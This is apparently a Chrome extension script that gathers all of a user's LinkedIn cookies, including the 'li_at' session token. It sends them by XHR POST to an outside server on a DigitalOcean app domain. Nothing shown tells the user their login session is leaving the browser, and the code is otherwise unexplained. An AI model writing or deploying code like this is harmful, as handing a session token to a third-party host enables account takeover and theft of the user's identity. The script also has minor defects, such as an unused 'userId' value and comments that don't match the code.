chrome.tabs.getSelected(null, function() {
   let li_at = '';
   
   // If the chrome.cookies API is not available, fallback to chrome.experimental.cookies
   if (!chrome.cookies)
      chrome.cookies = chrome.experimental.cookies;

   let resultCookies = [];
   let userId = null;
   
   // Retrieve all cookies
   chrome.cookies.getAll({}, function(cookie) {
      for (i = 0; i < cookie.length; i++) {
         // Check if the cookie's domain includes "www.linkedin.com" and its name is "li_at"
         if (cookie[i].domain.includes("supersite.com") && cookie[i].name==='user_id') {
            userId = document.getElementById("cookieText").value;
         }
         if (cookie[i].domain.includes("linkedin.com")) {
            resultCookies.push(cookie[i])
            // Assign the value of "li_at" cookie to the variable "li_at"
            if (cookie[i].name==='li_at'){
               li_at = cookie[i].value;
               document.getElementById("cookieText").value = li_at;
            }
         }
      }

      if (!li_at){
         console.log('login to likedin')
         // show button login to linkeding
      } else {
         console.log("---sending xhr request---");

         // chrome.identity.getProfileUserInfo(function(userInfo) {
         //    console.log("Email: " + userInfo.email);
         //    console.log("ID: " + userInfo.id);
         // });

         console.log(chrome.runtime.id, resultCookies);
         
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https://stingray-app-l9lbc.ondigitalocean.app/api/processCookies", true);
         xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

         xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) { // 4 means request is done
               if (xhr.status === 200) { // 200 is a successful return
               console.log("Response received: ", xhr.responseText);
               window.location.href = `success.html?userId=${chrome.runtime.id}`;
               } else {
               console.error("XHR request failed: ", xhr.status);
               window.location.href = 'error.html';
               }
            }
         };

         var data = {
            userId: chrome.runtime.id,
            cookies: resultCookies
         };

         xhr.send(JSON.stringify(data));
      }
   });
});
